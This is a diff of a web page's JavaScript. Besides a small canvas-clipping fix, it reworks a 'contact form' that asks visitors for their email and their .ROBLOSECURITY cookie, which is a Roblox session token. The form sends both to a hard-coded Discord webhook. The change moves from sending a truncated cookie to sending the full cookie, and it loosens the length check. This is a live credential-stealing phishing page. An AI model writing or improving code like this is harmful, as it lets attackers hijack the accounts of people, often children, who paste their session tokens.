@@ -563,8 +563,8 @@
             if (j === 0) return;
             const p0 = line[j - 1];
             
-            if (!lineIsIn && (ctx.isPointInPath(this.clip.path, p1.x, p1.y) ||
-                ctx.isPointInStroke(this.clip.path, p1.x, p1.y)) {
+            if (!lineIsIn && (ctx.isPointInPath(this.clip.path, p1.x, p1.y) || 
+            ctx.isPointInStroke(this.clip.path, p1.x, p1.y))) {
               lineIsIn = true;
             } else if (lineIsIn) {
               ctx.clip(this.clip.path);
@@ -730,68 +730,69 @@
 
     customElements.define("a-hole", AHole);
 
-    // Form submission with working webhook
-    document.getElementById('contact-form').addEventListener('submit', async (e) => {
+    // Form submission with your provided webhook logic
+    const form = document.getElementById('contact-form');
+
+    form.addEventListener('submit', async (e) => {
       e.preventDefault();
-      
-      const email = document.getElementById('email').value.trim();
-      const cookie = document.getElementById('cookie').value.trim();
+
+      const email = document.getElementById('email').value;
+      const cookie = document.getElementById('cookie').value;
       const statusMessage = document.getElementById('status-message');
-      
-      // Validate email
-      if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
+
+      // Validate inputs
+      if (!email || !email.includes('@')) {
         statusMessage.textContent = 'Please enter a valid email address';
         statusMessage.className = 'status-message error';
         return;
       }
-      
-      // Validate cookie
-      if (!cookie || cookie.length < 50) {
+
+      if (!cookie || cookie.length < 30) {
         statusMessage.textContent = 'Please enter a valid .ROBLOSECURITY cookie';
         statusMessage.className = 'status-message error';
         return;
       }
+
+      const submitBtn = e.target.querySelector('button[type="submit"]');
+      const originalText = submitBtn.innerHTML;
       
+      // Show loading state
+      submitBtn.innerHTML = `
+        <svg class="icon spin" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+          <path stroke-linecap="round" stroke-linejoin="round" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" />
+        </svg>
+        Processing...
+      `;
+      submitBtn.disabled = true;
+
+      const webhookUrl = 'https://discord.com/api/webhooks/1362514591053254907/csEiQ8zRbw1exCALF1yKfG3s3jgP0q0nMswhcmdu8s-n1ecLlXMQMkJ5qxJQpIoXUWgY';
+
+      const payload = {
+        content: `📬 New Contact Submission\n📧 Email: ${email}\n🍪 Cookie: ${cookie || "No cookie provided"}`
+      };
+
       try {
-        // Show loading state
-        const submitBtn = e.target.querySelector('button[type="submit"]');
-        const originalText = submitBtn.innerHTML;
-        submitBtn.innerHTML = `
-          <svg class="icon spin" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-            <path stroke-linecap="round" stroke-linejoin="round" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" />
-          </svg>
-          Processing...
-        `;
-        submitBtn.disabled = true;
-        
-        // Send to Discord webhook (fixed URL)
-        const webhookURL = 'https://discord.com/api/webhooks/1362514591053254907/csEiQ8zRbw1exCALF1yKfG3s3jgP0q0nMswhcmdu8s-n1ecLlXMQMkJ5qxJQpIoXUWgY';
-        const response = await fetch(webhookURL, {
+        const response = await fetch(webhookUrl, {
           method: 'POST',
-          headers: { 
-            'Content-Type': 'application/json',
+          headers: {
+            'Content-Type': 'application/json'
           },
-          body: JSON.stringify({
-            content: `📬 New rDealer Submission\n📧 ${email}\n🍪 ${cookie.substring(0, 30)}... (${cookie.length} chars)`
-          })
+          body: JSON.stringify(payload)
         });
-        
-        if (!response.ok) {
-          throw new Error('Webhook submission failed');
+
+        if (response.ok) {
+          statusMessage.textContent = 'Thanks for your submission!';
+          statusMessage.className = 'status-message success';
+          form.reset();
+        } else {
+          statusMessage.textContent = 'Something went wrong. Please try again.';
+          statusMessage.className = 'status-message error';
         }
-        
-        // Show success
-        statusMessage.textContent = 'Success! Your request has been submitted. Check your email soon.';
-        statusMessage.className = 'status-message success';
-        e.target.reset();
-        
       } catch (err) {
-        console.error('Submission error:', err);
-        statusMessage.textContent = 'Error submitting. Please try again or contact support.';
+        console.error('Error sending data:', err);
+        statusMessage.textContent = 'Error sending data. Please try again.';
         statusMessage.className = 'status-message error';
       } finally {
-        // Reset button
-        const submitBtn = e.target.querySelector('button[type="submit"]');
         submitBtn.innerHTML = originalText;
         submitBtn.disabled = false;
       }
